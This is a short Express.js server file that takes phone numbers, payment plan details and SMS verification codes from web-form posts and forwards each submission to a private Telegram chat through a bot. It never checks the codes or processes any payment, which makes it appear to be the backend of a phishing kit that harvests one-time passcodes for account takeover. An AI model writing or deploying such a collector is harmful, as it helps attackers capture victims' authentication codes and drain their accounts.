const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot credentials from Environment Variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Enable CORS for all routes (allows Netlify frontend to reach Render backend)
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files if hosted together
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to send messages to Telegram
async function sendTelegramNotification(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('[TELEGRAM LOG] Missing BOT_TOKEN or CHAT_ID environment variables.');
    return false;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();
    if (data.ok) {
      console.log('[TELEGRAM SUCCESS] Notification delivered successfully.');
      return true;
    } else {
      console.error('[TELEGRAM ERROR]', data.description);
      return false;
    }
  } catch (error) {
    console.error('[TELEGRAM FETCH ERROR]', error.message);
    return false;
  }
}

// Endpoint: Payment Request
app.post('/api/request-payment', async (req, res) => {
  const { phone, plan, amount } = req.body;

  console.log(`[PAYMENT REQUEST] Plan: ${plan || 'N/A'} | Amount: ${amount || 'N/A'} | Phone: ${phone}`);

  const message = `<b>New Payment Request</b>\n` +
                  `<b>Plan:</b> ${plan || 'N/A'}\n` +
                  `<b>Amount:</b> ${amount || 'N/A'}\n` +
                  `<b>Phone:</b> ${phone}`;

  await sendTelegramNotification(message);

  res.status(200).json({ success: true, message: 'Request received successfully.' });
});

// Endpoint: SMS / Verification
app.post('/api/verify-sms', async (req, res) => {
  const { code, phone } = req.body;

  console.log(`[VERIFICATION RECEIVED] Code: ${code} from Phone: ${phone || 'N/A'}`);

  const message = `<b>Verification Received</b>\n` +
                  `<b>Phone:</b> ${phone || 'N/A'}\n` +
                  `<b>Code:</b> ${code}`;

  await sendTelegramNotification(message);

  res.status(200).json({ success: true, message: 'Verification recorded.' });
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
  res.status(200).send('Server is active');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});